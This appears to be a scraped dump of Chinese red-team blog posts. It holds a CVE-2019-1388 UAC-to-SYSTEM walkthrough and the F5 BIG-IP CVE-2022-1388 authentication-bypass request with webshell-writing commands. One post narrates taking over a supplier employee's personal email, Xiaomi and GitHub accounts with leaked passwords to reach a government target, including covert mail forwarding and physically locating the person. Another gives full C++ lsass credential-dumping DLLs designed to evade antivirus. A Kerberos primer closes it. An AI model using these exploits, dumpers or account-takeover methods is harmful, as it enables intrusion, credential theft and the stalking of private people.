【温馨提示】提权过程中可能遇到需要翻墙才能打开网页、网页打不开等问题，我试了几台 Windows 7 虚拟机，包括 Windows7 - vs 2017，失败过几次。 参考链接： Windows7来宾帐户权限设置及磁盘配额，百度知道 Object Identifiers，微软官方文档 CVE-2019-1388 | Windows Certificate Dialog Elevation of Privilege Vulnerability，2019年11月12日 THANKSGIVING TREAT: EASY-AS-PIE WINDOWS 7 SECURE DESKTOP ESCALATION OF PRIVILEGE，ZERO DAY INITIATIVE，Simon Zuckerbraun，2019年11月19日 CVE-2019-1388: Windows Privilege Escalation Through UAC，2019年11月19日 CVE-2019-1388-master.zip 其二解析文章 CVE-2019-1388 CVE-2019-1388 | Windows Certificate Dialog Elevation of Privilege Vulnerability 2019年11月12日msrc发布了漏洞，官方的介绍是 An elevation of privilege vulnerability exists in the Windows Certificate Dialog when it does not properly enforce user privileges. An attacker who successfully exploited this vulnerability could run processes in an elevated context. An attacker could then install programs; view, change or delete data. To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take control of an affected system. The security update addresses the vulnerability by ensuring Windows Certificate Dialog properly enforces user privileges. 如果 Windows 证书对话框没有正确执行用户特权，则存在特权提升漏洞。成功利用此漏洞的攻击者可以在提升的环境中运行进程。然后，攻击者可能会安装程序，查看、更改或删除数据。要利用此漏洞，攻击者首先必须以普通用户权限登录系统。然后攻击者运行一个精心调制的应用，该应用可以利用此漏洞并控制受影响的系统。该安全更新通过确保 Windows 证书对话框正确执行用户特权来解决该漏洞。 影响范围也比较广，从win7到win10，server2008到2016，如果不打补丁都有威胁。 威胁测试名单 漏洞原理 此漏洞是因为 UAC（用户账户控制）机制的设定不严导致的。 默认情况下， Windows 在称为「安全桌面」的单独桌面上显示所有 UAC 提示。提示本身是由名为 consent.exe 的可执行文件生成的，该可执行文件以 NT AUTHORITY\\SYSTEM 身份运行并且有 System 的完整性水平。 由于用户可以与此安全桌面的 UI 进行交互，因此有必要对 UI 进行严格限制。否则，低特权用户可能能够通过 UI 操作的路由回路以 SYSTEM 的身份执行操作。甚至看起来无害的单独 UI 功能也可能是导致任意控制的一系列操作的第一步。 另一个需要了解的东西是 OID，如果在运行一个可执行文件的时候我们触发了 UAC，在点击「展示证书发行者的详细信息」这个链接之后： 我们可以看到证书里的 Issued by（颁发者） 字段，这个字段对应的值就是 OID。 对比一下cmd的证书 到这一步，也许找不到突破口，但是如果证书对话框定义了一个Microsoft特定对象标识符（OID），值1.3.6.1.4.1.311.2.1.10。其中WinTrust.h标头将其定义为SPC_SP_AGENCY_INFO_OBJID，如果存在，则将在细节标签中显示为SpcSpAgencyInfo。该OID的语义文献很少。但是，似乎证书对话框会解析此OID的值，如果它找到有效且格式正确的数据，它将使用它来将“常规”选项卡上的“颁发者”字段呈现为超链接。 当涉及证书对话框的UAC版本时，Microsoft没有禁用此超链接，这就给了我们提权的可能。 当 OID 为超链接时，通过点击此链接会触发 consent.exe 以 SYSTEM 权限打开浏览器访问此链接，然后此浏览器就会有 SYSTEM 权限。即使该浏览器是作为SYSTEM启动的，但是它仍显示在普通桌面而不是安全桌面上。因此，只有在用户退出所有UAC对话框后，它才变得可见。因此对于攻击者来说，这具有天然的隐藏优势。通过保存该浏览页面，会弹出微软的资源管理器，在资源管理器中邮件打开 cmd.exe 程序，就会继承浏览器的 SYSTEM 权限，由此就完成了由普通用户到 NT AUTHORITY\\SYSTEM 用户的提权！ 漏洞利用 以 Windows 7 为例： 先检查下补丁情况： 1 systeminfo&gt;snowming.txt&amp;(for %i in ( KB4525235 KB4525233) do @type micropoor.txt|@find /i &quot;%i&quot;|| @echo %i I can fuck)&amp;del /f /q /a snowming.txt 没打补丁，用户是刚刚建的普通用户。 这个漏洞利用的精髓在于运行的软件，用来触发 UAC 「安全桌面」的软件的 OID 一定要解析为超链接。这样才能触发 consent.exe 以 SYSTEM 权限打开浏览器访问这个链接。并且当然链接要能打开才行。 demo里给的文件是hhupd.exe，但是我在网上找了半天可用的版本都找不到，最后在群里要到一个可用的exe。 HHUPD.EXE 我们不需要运行这个文件，只需要唤起UAC即可。 双击打开唤起管理员验证的UAC 点超链接后就可以退出了 此时我们可以发现开启了一个IE浏览器，这里其实并不需要像其他的文章里说的那样等它把页面加载完。此时的浏览器已经是system权限了，想办法唤起资源管理器即可，我这里是 页面，另存为唤起资源管理器，然后在资源管理器里打开cmd，继承浏览器的system权限。 提权成功！ 相关研究人员也发布了一个进程链检测脚本 https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_exploit_cve_2019_1388.yml 这里有一个zerodayinitiative发表的关于利用的视频。 https://mp.weixin.qq.com/mp/readtemplate?t=pages/video_player_tmpl&amp;auto=0&amp;vid=wxv_1084758655733563392 参考资料 CVE-2019-1388 | Windows Certificate Dialog Elevation of Privilege Vulnerability THANKSGIVING TREAT: EASY-AS-PIE WINDOWS 7 SECURE DESKTOP ESCALATION OF PRIVILEGE Lz1y/imggo CVE-2019-1388：通过 UAC 进行 Windows 提权 最新Windows 7安全桌面提权漏洞风险提示与过程披露 jas502n/CVE-2019-1388 自我测试 要求：上3389 低权限test用户 执行HHUPD.exe 点击查看证书信息，随后点该超链接。 浏览器打开另存为该界面 直接在另存为框里运行cmd即可提权到system 提权成功 ","link":"https://redteamblog.icu/post/CVE-2019-1388：通过 UAC 进行 Windows 提权/"},{"title":"CVE-2022-1388 F5 BIG-IP未授权RCE漏洞&写Webshell","content":"漏洞描述 漏洞描述: 在 F5 BIG-IP 16.1.x 16.1.2.2 之前的版本、15.1.5.1 之前的 15.1.x 版本、14.1.4.6 之前的 14.1.x 版本、13.1.5 之前的 13.1.x 版本以及所有 12.1.x和 11.6.x 版本，未公开的请求可能会绕过 iControl REST 身份验证。注意：未评估已达到技术支持终止 (EoTS) 的软件版本. 复现过程 HTTP请求包如下： POST /mgmt/tm/util/bash HTTP/1.1 Host:xxxxxxx Connection: keep-alive, x-F5-Auth-Token X-F5-Auth-Token: anything Authorization: Basic YWRtaW46 Content-Length: 45 Content-Type:application/json { &quot;command&quot;:&quot;run&quot;, &quot;utilCmdArgs&quot;:&quot;-c id&quot; } EXP/POC CVE-2022-1388-EXP-main.zip Webshell写入 反弹获得了shell。 Webshell的写入可以参考另外一个漏洞F5 BIG-IP CVE-2020-5902 写入的路径为：/usr/local/www mount -o remount -rw /usr echo &quot;&lt;?php phpinfo();?&gt; &quot; &gt; /usr/local/www/test.php mount -o remount -r /usr 访问路径： 参考 F5 BIG-IP远程代码执行漏洞复现（CVE-2020-5902） CVE-2020-5902:F5 BIG-IP RCE分析研究 ","link":"https://redteamblog.icu/post/CVE-2022-1388 F5 BIG-IP未授权RCE漏洞&写Webshell/"},{"title":"记一次供应商到目标之旅","content":"因涉及敏感信息较多，厚码见谅。 最近一段时间有个项目，当时对某个单位目标进行了信息收集，该系统是一个邮件系统。 目标：XXX.gov.cn 某个政务级目标 系统：自建的邮件服务系统 系统有滑块验证，因此从web爆破邮箱的作用不大，同时，服务端也没有真实IP可以走协议爆破。 然后对该系统进行了信息收集，同时利用天眼查查询到目标所属资产的供应商为XXXX公司。该公司承包了该市级单位绝大部分的第三方系统开发，属于是很有价值的供应商，随即改变想法准备去从供应商下手。 0x2 供应商信息收集 XX科技 网址：testteam.com 法人邮箱：188888888@qq.com 法人手机号：18888888888 下属公司 XXX()科技 网址：1.testteam.com 法人邮箱：13333333@qq.com 法人手机号：13333333333 能从公开渠道查到的信息就只有这些，把收集到来的信息资产做了个查询，发现没啥可以利用的点，决定还是从网站入手。 扫描域名，只获得了一个IP，查询历史解析也没有多余的的IP，对这个IP进行全端口扫描，对外开放IP只有3389和443、80这种端口，而且是云服务器，子域名也没有多余的资产。 不过发现网站目录中提供了一个OA登录的接口 利用弱口令登录尝试，输入账号后返回空白，但实际上是登录成功了的。 不过登录流程逻辑可能有点问题，需要手动改请求和访问路径才可以到后台。 到了供应商后台也没有发现什么信息，资产又少，所以决定从员工下手。 众所周知，github的开发者常常喜欢放一些项目资料上去，一些脚本中的泄露账号密码此类的，于是我在GitHub上收集了到了疑似该公司的人。 他的项目仓库里面存有该公司的手册，同时我在另外一个项目找到了他的一个书签和口令密码，决定深挖此员工。 0x3 员工信息收集 从他的项目代码来看，不少都是本地的localhostIP,不过有个别的书签地址引起了我的注意，其中一个是小米官网。 根据现有的资产，该员工分别使用三个邮箱，分别为新浪和QQ，猜中他主要使用哪个邮箱也很容易，比如，查查小米的绑定。 利用找回密码功能获得小米的绑定邮箱，同时也获取到了该员工常用的邮箱。 利用之前获取到的口令使用网易邮箱大师登录网易邮箱，简略看了一下往来邮件，没啥太大的价值，为了避免后面打草惊蛇，给邮箱设置转发控下该邮箱。 随即使用该邮箱登录小米账号。 从个人收货地址获得了真实姓名和物理地址，确定了是属于该公司的物理地址，随即使用小米云服务定位到个人。 接着利用邮件中的地址，登录51job查看该员工简历。 也从该员工的历史信息中确定曾经在在目标公司的员工。 同时，从QQ邮箱中获取到了一些平台的账号。 从这些平台中登录了几个平台，不过都与目标无关系。 这个时候我已经在思考一个问题了，就是我拿了这么多信息，但是目标公司的OA，或者是内部交流使用什么渠道还不得知，无法从个人打到内部上去，内部肯定有一个通讯的地方，但是到目前为止，除了刚开始看到的技能手册，还没有看到该公司的任何信息，单纯的收集一些这种信息没啥用。 0x4 协同软件信息收集 1.腾讯文档 2.金山办公 3.钉钉 4.语雀 5.企业微信 6.微云 7.飞书 第二天，我依然坚持不懈的去找供应商的信息。 我在想既然官网没有业务或者OA，那么他们用什么平台去交流或者通讯呢？ 这里我尝试了语雀/飞书/有道云笔记/钉钉/印象笔记/WPS此类的软件，经过几次尝试后，大部分账号我都可以用获取到的口令登录，钉钉和企业微信我都可以登录，但是都需要手机号验证，也许用的是两个中的一种，没得搞。 语雀和腾讯文档都没写啥东西，没得搞。 微云除了个人资料之外，没有任何公司的信息，也没啥用。 那么只剩下WPS了。 这个时候比较有意思的来了，金山文档多多少少肯定有在使用的，我用他的账号去重置为他的常用密码即可，因为他的密码规律都差不多，我赌他自己发现密码错了拿常用密码试进去了不会多想。 但是呢，这个WPS的修改密码一直没有发到我的转发邮箱里面来，然后使用了github绑定的QQ+常用密码试进去了一个。 登录进去之后，yes！ 终于有目标资产的信息了，是一份公司的员工通讯录名单。 其实搞到这里就没准备搞了，因为确定不了目标使用的通讯平台，目标资产又较少，从员工打下去也不好说，接着从员工突破下去极有可能是徒劳的耗费时间。 想想从员工搞过来这条路，运气蛮好的，凡是邮箱设置了一个二次登录验证或者他密码规则改强一点，都拿不到这份通讯录，这个员工基本上啥信息都拿到了，我感觉可能使用的是钉钉，但是钉钉需要刷人脸登录。 0x5 拿到目标 搞到这里我就开始反思，这条路似乎是拿不下来目标了，一没拿到源码，二是没有拿到系统的密码，供应商也没有较大的突破。 看他使用github的比较多，我决定修改他的GitHub密码去翻仓库代码。 使用刚开始控制的新浪邮箱修改了他密码为他的常用口令，登录成功。 在查看他的所有仓库代码的时候，意外的找到了目标系统的一个口令，密码是一个常见的密码，账号比较长，属于是运气极佳了。 使用该账号登录成功，并且还是管理员属性。 最终拿到后台权限。 0x6 总结 没啥技术的一次渗透，运气是第一要素，环环相扣，干就完了。 ","link":"https://redteamblog.icu/post/gongyingshangmanyou/"},{"title":"一些获取Windows明文凭据的方法","content":"一些获取Windows明文凭据的方法 0x00 方法 1. Mimikatz直接读取Lsass 2. 签名/白名单文件Dump (1) AvDump.exe (2) CreateDump.exe (3) Rundll32.exe 3. 利用SilentProcessExit进行Dump 4. 添加自定义的SSP (1) 使用MemSSP对lsass进行patch (2) 使用AddSecurityPackage加载SSP (3) 通过RPC加载SSP 0x01 实现 1. 编写Dump Lsass的DLL 2. 将DLL与EXE文件打包 3. 将进程dump到内存 4. x86环境下利用RPC加载SSP 5. 其它可能用到的优化思路 0x02 可能遇到的问题 1. 缺少VC运行库 2. dump文件体积过大 0x03 总结 获取Windows用户的凭证信息是渗透过程中至关重要的一步，与杀软的对抗也在不断升级 本文对常见的Dump Lsass/获取明文凭据的方法进行简单的总结，以应对实战中各种各样的场景 0x00 方法 1. Mimikatz直接读取Lsass 优点： 方便快捷 缺点： mimikatz必须免杀 无法绕过部分AV对lsass的监控 经典姿势，使用mimikatz的sekurlsa::logonpasswords 其实是调用ReadProcessMemory来将lsass进程读入内存中的另一个地址中，然后对进程进行解析： 2. 签名/白名单文件Dump 优点： 程序拥有合法签名 远程Dump后下载到本地离线解析，减少特征 缺点： 虽然有签名但部分AV仍会发出警告 无法绕过部分AV对lsass的监控 dump得到的内存转储文件可能触发报警 主要有以下几个程序： Procdump.exe SqlDumper.exe AvDump.exe createdump.exe rundll32.exe 其中1、2、4这三个工具是有微软签名的，3是有杀软厂商Avast的签名，rundll32这个LOLBIN就不用说了 前两个工具的用法已经是老生常谈了，网上也有很多文章，主要讨论后三个 **PS：**注意使用这些工具的时候最好是system权限，如果是administrator的话要注意是否有SeDebugPrivilege，如果没有的话可以在命令前使用powershell -c (1) AvDump.exe AvDump.exe是杀软Avast自带的一个程序，该程序可以用来dump进程的内存，拥有Avast的签名 .\\AvDump.exe --pid &lt;lsass pid&gt; --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\\Users\\admin\\Desktop\\lsass.dmp --min_interval 0 (2) CreateDump.exe createdump.exe随着.NET5出现的，本身是个native binary 虽然createdump.exe是随着.NET5出现的，但因为它是native binary，所以执行时并不需要依赖.NET5的环境 createdump.exe -u -f lsass.dmp &lt;lsass pid&gt; (3) Rundll32.exe 其实就是使用rundll32直接执行comsvcs.dll的导出函数MiniDump来Dump进程内存 rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id C:\\Users\\admin\\Desktop\\lsass-comsvcs.dmp full 3. 利用SilentProcessExit进行Dump 优点： 系统正常行为 缺点： 需要写注册表 很久之前看到过让系统蓝屏，然后通过windbg调试系统崩溃文件来读取lsass进程，但个人感觉这种方法风险过大，并且产生的崩溃文件的体积非常大，在实战中的应用情况有限 直到不久前看到了一篇文章使用SilentProcessExit来使lsass静默退出，进而dump进程内存的方法，具体原理可以看文章： 利用SilentProcessExit机制dump内存 Silent Process Exit，即静默退出。而这种调试技术，可以派生 werfault.exe进程，可以用来运行任意程序或者也可以用来转存任意进程的内存文件或弹出窗口。 实际测试中，该方法确实可以dump lsass的进程内存 但在卡巴斯基环境下，不会报警但dump文件为0kb(猜测是卡巴拒绝系统行为转储lsass进程) 而遇到defender+360的情况下，同样不会触发报警，但该程序无法修改注册表项 4. 添加自定义的SSP (1) 使用MemSSP对lsass进行patch 优点： 不需要重启服务器 Lsass进程中不会出现可疑的DLL 缺点： 需要调用WriteProcessMemory对lsass进行操作，可能会被标记 该方法的大概原理是，通过打开lsass进程的句柄，然后搜索msv1_0.dll（支持交互式身份验证的DLL），找到之后对其中的SpAcceptCredentials函数进行hook，当用户进行认证时在SpAcceptCredentials函数第一行会首先jmp到我们的函数，将凭证写入文件后再跳回原函数 当我们执行后，尝试用户身份认证，可以看到密码被记录在mimilsa.txt中： lsass的进程中并不存在异常的DLL： (2) 使用AddSecurityPackage加载SSP 优点： 可以绕过部分杀软对lsass的监控 可以加载mimilib来记录密码以应对版本大于等于Windows Server 2012的情况 不需要重启服务器 缺点： 需要写注册表 需要将SSP的dll拷贝到system32下（这个说缺点似乎也谈不上） Blue Team可以通过枚举SSP来发现我们自定义的SSP，并且lsass进程中可以看到加载的DLL SSP和SSPI的知识就不谈了，添加SSP需要以下操作： 将mimilib.dll复制到c:\\windows\\system32下 将HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa\\处Security Packages的值设置为mimilib.dll 调用AddSecurityPackage添加SSP 相关代码可以参考：CredSSP 这里直接使用**@lengyi**师傅的代码，运行后会将存放在资源区的mimilib.dll释放到当前目录，然后移动到system32下，修改注册表，最终调用AddSecurityPackage添加ssp： 可以看到lsass进程加载了mimilib.dll： (3) 通过RPC加载SSP 优点： 可以绕过杀软对lsass的监控 可以加载mimilib来记录密码以应对版本大于等于Windows Server 2012的情况 不需要重启服务器 不需要写注册表 缺点： 因为没有写注册表，所以无法持久化，如果目标机器重启的话将无法记录密码（因此个人认为比较适合在Server上用，不适合在PC上用） 可以参考xpn关于mimikatz的系列文章： exploring-mimikatz-part-1 exploring-mimikatz-part-2 原理简单的来讲就是，xpn发现AddSecurityPackage()在被调用时会使用RPC（xpn的原文中说到：这是有道理的，因为这一调用需要向lsass发出信号来表明需要加载新的SSP） 因此可以通过调试获取传递给RPC的数据，进而可以发起RPC调用，而不用使用AddSecurityPackage()这个API去调用 加载的dll可以是直接dump lsass的，也可以是加载mimilib这种记录密码的 0x01 实现 一些Dump Lsass方法or技巧的简单实现，以及实战中的一些优化 1. 编写Dump Lsass的DLL 需要以下几步操作： 获取Debug权限 找到lsass的PID 使用MiniDump或MiniDumpWriteDump进行内存dump 这个逻辑很简单，其中获取debug权限和自动寻找lsass的PID网上也有不少的Demo，所以很好实现 #include &lt;stdio.h&gt; #include &lt;Windows.h&gt; #include &lt;tlhelp32.h&gt; typedef HRESULT(WINAPI* _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline); int GetLsassPid() { PROCESSENTRY32 entry; entry.dwSize = sizeof(PROCESSENTRY32); HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL); if (Process32First(hSnapshot, &amp;entry)) { while (Process32Next(hSnapshot, &amp;entry)) { if (wcscmp(entry.szExeFile, L&quot;lsass.exe&quot;) == 0) { return entry.th32ProcessID; } } } CloseHandle(hSnapshot); return 0; } void GetDebugPrivilege() { BOOL fOk = FALSE; HANDLE hToken; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) { TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid); tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0; AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL); fOk = (GetLastError() == ERROR_SUCCESS); CloseHandle(hToken); } } void DumpLsass() { wchar_t ws[100]; _MiniDumpW MiniDumpW; MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L&quot;comsvcs.dll&quot;), &quot;MiniDumpW&quot;); swprintf(ws, 100, L&quot;%u %hs&quot;, GetLsassPid(), &quot;c:\\\\windows\\\\temp\\\\temp.bin full&quot;); GetDebugPrivilege(); MiniDumpW(0, 0, ws); } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: DumpLsass(); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 我们先拿rundll32测试一下，成功dump了lsass进程： 然后使用利用RPC加载SSP的方式来转储lsass的进程内存： 成功绕过卡巴斯基对lsass的监控 2. 将DLL与EXE文件打包 我们在使用该方法时需要上传exe和dll，并且XPN原版的代码需要将SSP DLL的绝对路径作为参数传入，在使用时非常不方便 因此我们可以将DLL放入exe的资源节区，然后在运行时释放到程序所在目录，加载完成后再删除DLL 成功dump lsass进程的内存： 关于将文件添加到资源区并释放可以参考：C++实现第三方资源释放与载入过程（以DLL为例） 3. 将进程dump到内存 部分AV/EDR会监控我们dump下来的进程转储文件，因此我们有时需要将进程dump到一块内存中，进行加密后再写入磁盘，或者直接通过网络进行传输 主要利用的是MiniDumpWriteDump的回调函数来实现该操作 我这里借鉴了@ired.team的代码（文章戳这里），并在内存中对进程转储数据进行与0x32的按位异或，通过编译为dll然后使用rundll32加载 // dllmain.cpp : Defines the entry point for the DLL application. #include &quot;pch.h&quot; #include &lt;windows.h&gt; #include &lt;DbgHelp.h&gt; #include &lt;iostream&gt; #include &lt;TlHelp32.h&gt; #include &lt;processsnapshot.h&gt; #pragma comment (lib, &quot;Dbghelp.lib&quot;) LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75); DWORD bytesRead = 0; int GetLsassPid() { PROCESSENTRY32 entry; entry.dwSize = sizeof(PROCESSENTRY32); HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL); if (Process32First(hSnapshot, &amp;entry)) { while (Process32Next(hSnapshot, &amp;entry)) { if (wcscmp(entry.szExeFile, L&quot;lsass.exe&quot;) == 0) { return entry.th32ProcessID; } } } CloseHandle(hSnapshot); return 0; } void GetDebugPrivilege() { BOOL fOk = FALSE; HANDLE hToken; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) { TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid); tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0; AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL); fOk = (GetLastError() == ERROR_SUCCESS); CloseHandle(hToken); } } BOOL CALLBACK minidumpCallback( __in PVOID callbackParam, __in const PMINIDUMP_CALLBACK_INPUT callbackInput, __inout PMINIDUMP_CALLBACK_OUTPUT callbackOutput ) { LPVOID destination = 0, source = 0; DWORD bufferSize = 0; switch (callbackInput-&gt;CallbackType) { case IoStartCallback: callbackOutput-&gt;Status = S_FALSE; break; // Gets called for each lsass process memory read operation case IoWriteAllCallback: callbackOutput-&gt;Status = S_OK; // A chunk of minidump data that's been jus read from lsass. // This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it. // We will simply save it to dumpBuffer. source = callbackInput-&gt;Io.Buffer; // Calculate location of where we want to store this part of the dump. // Destination is start of our dumpBuffer + the offset of the minidump data destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput-&gt;Io.Offset); // Size of the chunk of minidump that's just been read. bufferSize = callbackInput-&gt;Io.BufferBytes; bytesRead += bufferSize; RtlCopyMemory(destination, source, bufferSize); break; case IoFinishCallback: callbackOutput-&gt;Status = S_OK; break; default: return true; } return TRUE; } void DumpLsass() { DWORD lsassPID = GetLsassPid(); DWORD bytesWritten = 0; // Set up minidump callback MINIDUMP_CALLBACK_INFORMATION callbackInfo; ZeroMemory(&amp;callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION)); callbackInfo.CallbackRoutine = &amp;minidumpCallback; callbackInfo.CallbackParam = NULL; GetDebugPrivilege(); HANDLE lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID); // Dump lsass BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &amp;callbackInfo); for (DWORD i = 0; i &lt; bytesRead; i++) { *((BYTE*)dumpBuffer + i) ^= 0x32; } // At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt &amp; exfiltrate HANDLE outFile = CreateFile(L&quot;c:\\\\temp\\\\temp.bin&quot;, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // For testing purposes, let's write lsass dump to disk from our own dumpBuffer and check if mimikatz can work it WriteFile(outFile, dumpBuffer, bytesRead, &amp;bytesWritten, NULL); } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: DumpLsass(); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 最终得到的temp.bin如下，左边是使用procdump得到的未加密的进程转储文件： 我们可以编写一个python脚本来将文件解密回来 with open(&quot;C:\\\\Temp\\\\temp.bin&quot;, &quot;rb&quot;) as f1: with open(&quot;C:\\\\Temp\\\\temp2.bin&quot;, &quot;ab&quot;) as f2: data = f1.read() print(len(data)) for i in range(len(data)): newData = 0x32 ^ data[i] f2.write(bytes([newData])) 可以使用mimikatz成功读取： 4. x86环境下利用RPC加载SSP TODO 5. 其它可能用到的优化思路 Dump进程的敏感API通过动态调用/API Hashing技术来规避静态检测 编写自己的dump函数，部分敏感API使用Direct Syscall 与C2结合，dump的文件/读取的hash直接回传 0x02 可能遇到的问题 1. 缺少VC运行库 在某次授权渗透测试中，出现目标机器缺失VC运行库的问题： 设置项目为静态链接程序所需要的运行库即可，如下图所示： 成功运行，目标环境中存在卡巴斯基EDR，最终成功dump lsass 2. dump文件体积过大 有时我们可能会打到不出网的服务器，而此时我们又没有稳定的代理（Regeorg这些速度太慢），仅仅有一个webshell来下载大于30M的文件是十分不稳定的 个人一般的思路就是： 免杀mimikatz或提取sekurlsa模块，将工具传上去读 上传7z.exe&amp;&amp;7z.dll，将文件进行分卷压缩再下载 也想过直接把读取的功能写入SSP DLL里，然后结果输出到磁盘，但还未进行尝试，先算作一种思路吧 0x03 总结 无杀软随便玩，直接mimikatz上去读就是 无监控lsass的AV/EDR，可以通过免杀mimikatz进行直接读取，也可以使用白名单程序进行dump（需要注意部分杀软会对白名单程序报警） 如果是卡巴这种监控lsass的，最好是使用加载SSP的方式，优缺点参考前面的，可以根据不同情况使用不同的方法 ","link":"https://redteamblog.icu/post/41016eb03b2343a69a9be35f251f1e9c/"},{"title":"Kerberos认证协议学习","content":"环境 目前环境有两台机器， 其一为Windows2008，IP为192.168.1.3 是域redream的成员。 其二为Windows2016，为域控制器。IP为 192.168.1.2 主机 用户 IP 域控（2016） Administrator 192.169.1.2 域主机（2008） user1 192.168.1.3 kerberos协议 Kerberos 协议是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。其设计目标是通过密钥系统为客户机与服务器应用程序提供强大的认证服务。该协议的认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。Kerberos 协议在在内网域渗透领域中至关重要，白银票据、黄金票据、攻击域控等都离不开 Kerberos 协议。 为了让阁下能够更轻松地理解后文对认证原理的讲解，你需要先了解以下几个关键角色： 角色 作用 Domain Controller 域控制器，简称DC，一台计算机，实现用户、计算机的统一管理。 Key Distribution Center 秘钥分发中心，简称KDC，默认安装在域控里，包括AS和TGS。 Authentication Service 身份验证服务，简称AS，用于KDC对Client认证。 Ticket Grantng Service 票据授予服务，简称TGS，用于KDC向Client和Server分发Session Key（临时秘钥）。 Active Directory 活动目录，简称AD，用于存储用户、用户组、域相关的信息。 Client 客户端，指用户。 Server 服务端，可能是某台计算机，也可能是某个服务。 kerberos 概念名词解释 (1)Client:访问服务的客户机 (2)Server:提供服务的服务器 (3)KDC(Key Distribution Center):密钥分发中心 (4)KDC中分成两个部分:Authentication Service和Ticket Granting Service Authentication Service(AS):身份验证服务 Ticket Granting Service(TGS):票据授予服务 AS和TGS如下： Authentication Service：AS的作用就是验证Client端的身份，验证通过之后，AS就会给TGT票据(Ticket Granting Ticket)给Client. Ticket-granting cookie(TGC):存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，是CAS Server用来明确用户身份的凭证。TGT封装了TGC值以及此Cookie值对应的用户信息. Ticket-granting ticket(TGT):TGT对象的ID就是TGC的值，在服务器端，通过TGC查询TGT. Ticket Granting Service(TGS)：TGS的作用是通过AS发送给Client的TGT换取访问Server端的ST(Server Ticket)给Client. SEerver Ticket(ST):ST服务票据，由TGS服务发布. (5)Active Directory(AD):活动目录 (6)Domain Controller(DC):域控制器 (7)Ticket-granting cookie(TGC):存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，是CAS Server用来明确用户身份的凭证。TGT封装了TGC值以及此Cookie值对应的用户信息. (8)Ticket-granting ticket(TGT):TGT对象的ID就是TGC的值，在服务器端，通过TGC查询TGT. 打个比方：当 whoami 要和 bunny 进行通信的时候，whoami 就需要向 bunny 证明自己是whoami，直接的方式就是 whoami 用二人之间的秘密做秘钥加密明文文字生成密文，把密文和明文文字一块发送给 bunny，bunny 再用秘密解密得到明文，把明文和明文文字进行对比，若一致，则证明对方是 whoami。 但是网络中，密文和文字很有可能被窃取，并且只要时间足够，总能破解得到秘钥。所以不能使用这种长期有效的秘钥，要改为短期的临时秘钥。那么这个临时秘钥就需要一个第三方可信任的机构来提供，即 KDC（Key Distribution Center）秘钥分发中心。 Kerberos认证的过程形象地比喻如下： 疫情期间，小明去拿一个重要包裹，由于包裹是来自海外的，所以需要严格登记： （1）拿包裹的时候，为了证明自己是合法公民，小明先把身份证给工作人员 （2）快递点的身份认证系统通过身份认证后，给小明一张身份认证通过证明 （3）小明拿着身份认证通过证明，来到快递收发处等一张拿快递的号码牌 （4）售票处给了张号码牌 （5）小明拿着号码牌拿快递去了 （6）在拿快递时，小明拿出自己的身份认证材料给快递点的工作人员，工作人员向快递公司的数据管理中心发了消息，问问小明是不是有包裹要拿 （7）数据管理中心将小明的快递单号，身份信息等发了过来 （8）工作人员将数据管理中心发来的信息与小明给的材料对比，得出小明是好公民，有一个重要包裹，于是带着小明来到仓库的金库，把装有老魔杖的包裹给了小明 在Kerboeros协议认证过程中，会用到两个基础认证模块，分别是AS_REQ&amp;AS_REP和TGS_REQ&amp;TGS_REP，以及在认证过程中可能会使用到的S4U和PAC这两个认证模块。 kerberos认证的问题 上面说了，因为kerberos协议的实现，需要三方的参与，分别如下： 1.client 访问服务的客户机 2.Server 提供服务的服务器 3.KDC(Key Distribution Center) 密钥分发中心 